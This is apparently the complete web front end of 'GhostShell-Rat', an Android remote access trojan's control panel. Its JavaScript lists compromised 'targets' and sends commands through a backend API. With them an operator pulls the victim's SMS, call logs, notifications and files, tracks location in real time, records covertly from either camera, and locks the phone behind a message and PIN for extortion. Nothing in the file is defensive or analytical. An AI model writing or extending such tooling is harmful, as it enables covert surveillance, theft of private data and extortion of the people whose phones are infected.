<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>GhostShell-Rat ¬∑ anonymous</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', 'Courier New', monospace, system-ui; }
        :root {
            --bg: #0b0f0e;
            --surface: #141a1a;
            --surface-light: #1f2828;
            --accent-primary: #00ffc3;
            --accent-secondary: #ff3b9e;
            --glow-primary: rgba(0, 255, 195, 0.25);
            --glow-secondary: rgba(255, 59, 158, 0.3);
            --text: #dbdbdb;
            --text-dim: #8fadad;
            --border-glow: 0 0 0 1px var(--accent-primary), 0 0 12px var(--glow-primary);
            --transition: all 0.25s cubic-bezier(0.23, 1, 0.32, 1);
        }

        body {
            background-color: var(--bg);
            color: var(--text);
            min-height: 100vh;
            padding: 12px;
            display: flex;
            align-items: flex-start;
            justify-content: center;
            background-image: radial-gradient(circle at 20% 30%, #10312b 0%, transparent 40%);
            background-attachment: fixed;
        }

        /* system loading bar */
        #sys-loader {
            position: fixed; inset: 0; background: var(--bg);
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            z-index: 9999; transition: opacity 0.6s ease, visibility 0.6s;
            backdrop-filter: blur(4px);
        }
        .loader-hidden { opacity: 0; visibility: hidden; pointer-events: none; }
        .cyber-bar { width: 260px; height: 6px; background: #1f2b2b; border-radius: 8px; box-shadow: inset 0 0 6px #000; margin: 20px 0 10px; overflow: hidden; }
        .cyber-fill { height: 100%; width: 0%; background: linear-gradient(90deg, var(--accent-primary), var(--accent-secondary)); box-shadow: 0 0 18px var(--glow-primary); transition: width 0.3s; }
        #loader-text { font-size: 1.6rem; font-weight: 300; letter-spacing: 6px; color: var(--accent-primary); text-shadow: 0 0 8px var(--accent-primary); animation: flicker 2.4s infinite; }

        .app-container { width: 100%; max-width: 1300px; display: flex; flex-direction: column; gap: 14px; }

        .header {
            background: var(--surface); border: 1px solid var(--accent-primary);
            box-shadow: 0 0 15px var(--glow-primary); padding: 1.2rem;
            border-radius: 28px; display: flex; align-items: center; justify-content: space-between;
        }
        .header h1 { font-size: 1.8rem; font-weight: 400; letter-spacing: 2px; background: linear-gradient(135deg, #b0ffec, var(--accent-secondary)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }

        .dashboard-grid { display: grid; grid-template-columns: 280px 1fr; gap: 16px; }

        .panel { background: var(--surface); border-radius: 28px; border: 1px solid var(--accent-primary); padding: 20px; box-shadow: var(--border-glow); backdrop-filter: blur(4px); }
        .device-panel { max-height: 75vh; overflow-y: auto; }
        .device-panel h2 { font-size: 1.1rem; margin-bottom: 18px; color: var(--accent-secondary); border-bottom: 1px dashed #2a3a3a; padding-bottom: 10px; }

        .device-item {
            background: #1b2626; padding: 16px; border-radius: 20px; border: 1px solid transparent;
            cursor: pointer; transition: var(--transition); margin-bottom: 10px;
        }
        .device-item:hover { border-color: var(--accent-primary); background: #1f2e2e; }
        .device-item.active { border-color: var(--accent-secondary); box-shadow: 0 0 16px var(--glow-secondary); background: #1d2c2c; }
        .device-item strong { display: block; color: var(--accent-primary); font-size: 1rem; }
        .device-item small { font-size: 0.75rem; color: var(--text-dim); }

        .status-bar { display: flex; justify-content: space-between; background: #0f1818; padding: 14px 20px; border-radius: 40px; margin-bottom: 24px; border: 1px solid #2a3a3a; }
        .status-online { color: #00ffc3; font-weight: 600; position: relative; padding-left: 15px; }
        .status-online::before { content: ""; position: absolute; left: 0; top: 6px; width: 10px; height: 10px; background: #00ffc3; border-radius: 50%; animation: pulse 1.5s infinite; }

        .feature-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); gap: 12px; }
        .grid-item {
            background: #1b2828; border: 1px solid #2f4040; border-radius: 24px; padding: 18px 8px;
            text-align: center; color: var(--accent-primary); transition: var(--transition); cursor: pointer;
        }
        .grid-item i { font-size: 2rem; margin-bottom: 10px; display: block; color: var(--accent-secondary); }
        .grid-item:hover { background: #1e3030; border-color: var(--accent-primary); box-shadow: 0 0 24px var(--glow-primary); transform: translateY(-3px); }
        .grid-item.disabled { opacity: 0.3; pointer-events: none; filter: grayscale(1); }

        .modal { display: none; position: fixed; inset: 0; background: rgba(2, 10, 10, 0.9); backdrop-filter: blur(10px); align-items: center; justify-content: center; z-index: 1000; padding: 20px; }
        .modal-card { background: var(--surface); width: 100%; max-width: 900px; max-height: 85vh; border-radius: 36px; border: 1px solid var(--accent-primary); box-shadow: 0 0 40px var(--glow-secondary); display: flex; flex-direction: column; overflow: hidden; }
        .modal-header { padding: 24px; background: #101b1b; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #2e4545; }
        .modal-body { padding: 24px; overflow-y: auto; flex: 1; }
        .modal-footer { padding: 18px 24px; background: #0c1616; display: flex; gap: 12px; border-top: 1px solid #2e4545; }

        .toast-popup { position: fixed; top: 24px; right: 24px; background: #121f1f; border-left: 6px solid var(--accent-secondary); padding: 20px 28px; border-radius: 24px; box-shadow: 0 10px 40px rgba(0,0,0,0.8); border: 1px solid var(--accent-primary); color: white; z-index: 3000; animation: slideIn 0.4s cubic-bezier(0.18, 0.89, 0.32, 1.28) forwards; }
        
        table { width: 100%; border-collapse: collapse; }
        th { text-align: left; color: var(--accent-primary); border-bottom: 1px solid #3d5a5a; padding: 10px; }
        td { padding: 10px; border-bottom: 1px solid #1e2e2e; color: var(--text-dim); }

        input, button { background: #1e2e2e; border: 1px solid #3b5e5e; padding: 14px 20px; border-radius: 60px; color: white; width: 100%; }
        button { background: var(--accent-primary); color: #000; font-weight: bold; border: none; cursor: pointer; }
        button:active { transform: scale(0.96); }

        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
        @keyframes flicker { 0%, 45%, 47%, 49%, 90%, 92%, 100% { opacity: 1; } 46%, 48%, 91% { opacity: 0.2; } }
        @keyframes slideIn { from { transform: translateX(500px); } to { transform: translateX(0); } }
    </style>
</head>
<body>
    <div id="sys-loader">
        <div id="loader-text">GHOST//SHELL</div>
        <div class="cyber-bar"><div class="cyber-fill" id="loader-fill"></div></div>
    </div>

    <div class="app-container">
        <header class="header">
            <h1><i class="fas fa-skull"></i> GhostShell-Rat</h1>
            <div style="color:var(--accent-secondary); font-size:2rem;"><i class="fas fa-ghost"></i></div>
        </header>

        <div class="dashboard-grid">
            <div class="panel device-panel">
                <h2><i class="fas fa-satellite-dish"></i> TARGETS</h2>
                <div id="device-list"></div>
            </div>

            <div class="panel main-panel">
                <div class="status-bar">
                    <span>üéØ <span id="device-info" style="color:var(--accent-primary);">None Selected</span></span>
                    <span>‚ö° <span id="connection-status">OFFLINE</span></span>
                </div>
                <div id="main-grid-panel" class="feature-grid"></div>
            </div>
        </div>
    </div>

    <div id="main-modal" class="modal">
        <div class="modal-card">
            <div class="modal-header">
                <h2 id="modal-title" style="color:var(--accent-secondary);"></h2>
                <span style="cursor:pointer; font-size:2.5rem; color:var(--text-dim);" onclick="closeModal()">&times;</span>
            </div>
            <div class="modal-body" id="modal-body"></div>
            <div class="modal-footer" id="modal-footer"></div>
        </div>
    </div>

    <div id="popup-toast" class="toast-popup" style="display: none;"></div>

    <script>
        (function() {
            let w = 0; const f = document.getElementById('loader-fill');
            const i = setInterval(() => { w += 5; f.style.width = w + '%'; if (w >= 100) { clearInterval(i); setTimeout(() => document.getElementById('sys-loader').classList.add('loader-hidden'), 500); } }, 30);
        })();

        let state = { devices: [] }, selectedClientId = null, currentModal = null, clientDataCache = {}, lastDataHashes = {}, notificationHashes = new Set();
        let flashOn = false, screenRecordOn = false;

        function showPopup(type, message, duration = 8000) {
            const toast = document.getElementById('popup-toast');
            toast.style.display = 'block';
            toast.innerHTML = `<div style="display:flex;align-items:center;gap:15px;"><i class="fas fa-bell" style="font-size:1.5rem;color:var(--accent-secondary);"></i><span>${message}</span></div>`;
            setTimeout(() => { toast.style.display = 'none'; }, duration);
        }

        async function sendCommand(cmd, body = {}) {
            if (!selectedClientId) return;
            try {
                const res = await fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ cmd, client_id: selectedClientId, ...body }) });
                return await res.json();
            } catch (e) { console.error(e); }
        }

        function selectDevice(clientId, skipModalClose = false) {
            if (selectedClientId === clientId) return;
            selectedClientId = clientId;
            document.querySelectorAll('.device-item').forEach(el => el.classList.remove('active'));
            const el = document.getElementById(`device-${clientId.replace(/[:.]/g, '-')}`);
            if (el) el.classList.add('active');
            updateMainDashboard();
            if (!skipModalClose) closeModal();
        }

        function updateDeviceList() {
            const container = document.getElementById('device-list');
            if (!state.devices || !state.devices.length) {
                container.innerHTML = '<div class="device-item" style="opacity:0.5">‚ô¢ no ghosts connected</div>';
                return;
            }
            container.innerHTML = state.devices.map(dev => `
                <div class="device-item ${selectedClientId === dev.id ? 'active' : ''}" id="device-${dev.id.replace(/[:.]/g, '-')}" onclick="selectDevice('${dev.id}')">
                    <strong>${dev.model}</strong>
                    <small>${dev.id}</small>
                </div>`).join('');
            if (!selectedClientId) selectDevice(state.devices[0].id, true);
        }

        function updateMainDashboard() {
            const grid = document.getElementById('main-grid-panel');
            const enabled = !!selectedClientId;
            if (enabled) {
                const dev = state.devices.find(d => d.id === selectedClientId);
                document.getElementById('device-info').innerText = dev ? dev.model : selectedClientId;
                document.getElementById('connection-status').innerText = 'ONLINE';
                document.getElementById('connection-status').className = 'status-online';
            }
            const buttons = ['sms','calls','filemanager','gallery','notifications','apps','lock','openurl','get_location','recorder','wallpaper','flash'];
            grid.innerHTML = buttons.map(btn => {
                let icon = 'fa-cog', label = btn.toUpperCase();
                if (btn === 'sms') icon = 'fa-sms';
                else if (btn === 'calls') icon = 'fa-phone-alt';
                else if (btn === 'filemanager') icon = 'fa-folder-open';
                else if (btn === 'gallery') icon = 'fa-images';
                else if (btn === 'lock') { icon = 'fa-user-lock'; label = 'LOCK DEVICE'; }
                else if (btn === 'get_location') { icon = 'fa-crosshairs'; label = 'LOKASI REALTIME'; }
                else if (btn === 'recorder') { icon = 'fa-video'; label = 'RECORDER'; }
                else if (btn === 'wallpaper') { icon = 'fa-image'; label = 'WALLPAPER'; }
                else if (btn === 'flash') { icon = 'fa-bolt'; label = flashOn ? 'FLASH ON' : 'FLASH OFF'; }
                return `<div class="grid-item ${!enabled ? 'disabled' : ''}" onclick="handleGridClick('${btn}')"><i class="fas ${icon}"></i>${label}</div>`;
            }).join('');
        }

        window.handleGridClick = (action) => {
            if (action === 'get_location') { sendCommand('get_location'); openModal('get_location'); }
            else if (action === 'flash') { flashOn = !flashOn; sendCommand(flashOn ? 'flashon' : 'flashoff'); updateMainDashboard(); }
            else openModal(action);
        };

        function openModal(type) {
            currentModal = type; lastDataHashes[type] = "";
            document.getElementById('main-modal').style.display = 'flex';
            document.getElementById('modal-title').innerText = type.toUpperCase().replace('_', ' ');
            document.getElementById('modal-body').innerHTML = '<div style="text-align:center;padding:40px;"><i class="fas fa-spinner fa-spin" style="font-size:3rem;color:var(--accent-primary);"></i></div>';
            const cmdMap = { sms:'getsms', calls:'getcalllogs', filemanager:'filemanager', gallery:'gallery', apps:'list_app', notifications:'getnotifications' };
            if (cmdMap[type]) sendCommand(cmdMap[type]);
            renderModalContent();
        }

        function closeModal() {
            if (currentModal === 'recorder') {
                const d = clientDataCache[selectedClientId];
                if (d?.last_video) fetch('/api/delete_file', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ filename: d.last_video }) });
            }
            document.getElementById('main-modal').style.display = 'none'; currentModal = null;
        }

        function renderModalContent() {
            if (!currentModal || !selectedClientId) return;
            const body = document.getElementById('modal-body'), footer = document.getElementById('modal-footer'), data = clientDataCache[selectedClientId] || {};
            footer.innerHTML = '';

            if (currentModal === 'lock') {
                body.innerHTML = `<div style="text-align:center;padding:10px;"><input id="l-msg" placeholder="Target Message" style="margin-bottom:15px;"><input id="l-pin" placeholder="Unlock PIN" type="number" style="text-align:center;letter-spacing:5px;"></div>`;
                footer.innerHTML = `<button onclick="sendLock()" style="background:red;">üîí EXECUTE LOCK</button>`;
            } 
            else if (currentModal === 'get_location') {
                if (data.location_url) {
                    const coords = data.location_url.split('q=')[1];
                    const imgHtml = data.location_image ? `<img src="${data.location_image}" style="width:100%;border-radius:18px;margin-top:15px;border:2px solid var(--accent-primary);">` : '';
                    body.innerHTML = `<div style="text-align:center;"><iframe width="100%" height="250" frameborder="0" src="https://maps.google.com/maps?q=${coords}&z=15&output=embed"></iframe><p style="color:var(--accent-primary);margin:15px 0;">üìç ${coords}</p><div style="display:flex;gap:10px;"><a href="${data.location_url}" target="_blank" style="flex:1;border:1px solid;padding:10px;border-radius:30px;text-decoration:none;color:white;text-align:center;">Open Maps</a><button onclick="sendCommand('stop_location')" style="flex:1;background:var(--accent-secondary);">STOP</button></div>${imgHtml}</div>`;
                } else { body.innerHTML = '<div style="text-align:center;padding:40px;"><i class="fas fa-satellite-dish fa-spin" style="font-size:3rem;color:var(--accent-secondary);"></i><p>Locating...</p></div>'; }
            }
            else if (currentModal === 'recorder') {
                if (data.record_status === 'done' && data.last_video) {
                    body.innerHTML = `<div style="text-align:center;"><video width="100%" controls style="border-radius:18px;border:2px solid var(--accent-primary);"><source src="/captured_images/${data.last_video}" type="video/mp4"></video><br><br><a href="/captured_images/${data.last_video}" download style="color:var(--accent-primary);text-decoration:none;border:1px solid;padding:10px 20px;border-radius:20px;">üíæ Download Video</a></div>`;
                } else if (data.record_status) { body.innerHTML = `<div style="text-align:center;padding:40px;"><i class="fas fa-circle-notch fa-spin" style="font-size:3rem;color:red;"></i><h3 style="margin-top:20px;color:red;">${data.record_status.toUpperCase()}</h3></div>`; }
                else { body.innerHTML = `<div style="text-align:center;padding:20px;"><i class="fas fa-video" style="font-size:4rem;margin-bottom:20px;color:var(--accent-secondary);"></i><div style="display:flex;gap:15px;"><button onclick="sendCommand('record_front')">üì∑ FRONT</button><button onclick="sendCommand('record_back')">üì∑ BACK</button></div></div>`; }
            }
            else if (currentModal === 'wallpaper') {
                body.innerHTML = `<div style="text-align:center;"><input id="wp-url" placeholder="Direct Image URL"></div>`;
                footer.innerHTML = `<button onclick="sendWP()">HIJACK WALLPAPER</button>`;
            }
            else if (currentModal === 'sms') {
                const logs = data.sms_logs || [];
                body.innerHTML = `<table><tr><th>Sender</th><th>Message</th></tr>${logs.map(l => `<tr><td>${l.userSender}</td><td>${l.content}</td></tr>`).join('')}</table>`;
            }
            else if (currentModal === 'calls') {
                const logs = data.call_logs || [];
                body.innerHTML = `<table><tr><th>Number</th><th>Dur</th></tr>${logs.map(l => `<tr><td>${l.number}</td><td>${l.duration_seconds}s</td></tr>`).join('')}</table>`;
            }
            else if (currentModal === 'filemanager') {
                const fm = data.file_manager || { path: '/', files: [] };
                body.innerHTML = `<p style="color:var(--accent-primary);margin-bottom:10px;">üìç ${fm.path}</p><table>${fm.files.map(f => `<tr><td>${f.isDirectory ? 'üìÅ' : 'üìÑ'} ${f.name}</td><td><button onclick="sendCommand('get ${f.name}')" style="padding:4px 8px;font-size:0.7rem;">GET</button></td></tr>`).join('')}</table>`;
            }
        }

        window.sendLock = () => { sendCommand(`lock ${document.getElementById('l-msg').value || 'SYSTEM LOCKED'}|${document.getElementById('l-pin').value || '1234'}`); closeModal(); };
        window.sendWP = () => { sendCommand(`set_wallpaper ${document.getElementById('wp-url').value}`); closeModal(); };

        async function pollStatus() {
            try {
                const res = await fetch('/api/status');
                const data = await res.json();
                state.devices = data.devices || [];
                updateDeviceList();
                if (selectedClientId) {
                    const dres = await fetch(`/api/client_data/${selectedClientId}`);
                    const cdata = await dres.json();
                    clientDataCache[selectedClientId] = cdata;
                    if (currentModal) renderModalContent();
                    if (cdata.location_status === 'success' && lastDataHashes['loc'] !== cdata.location_url) { lastDataHashes['loc'] = cdata.location_url; showPopup('info', 'üéØ TARGET TRACKED!'); }
                    if (cdata.notifications?.length) {
                        const n = cdata.notifications[0];
                        if (!notificationHashes.has(selectedClientId + n.text)) { showPopup('info', `[${n.packageName}] ${n.title}: ${n.text}`); notificationHashes.add(selectedClientId + n.text); }
                    }
                }
            } catch (e) { console.error(e); }
            setTimeout(pollStatus, 3000);
        }
        pollStatus();
    </script>
</body>
</html>
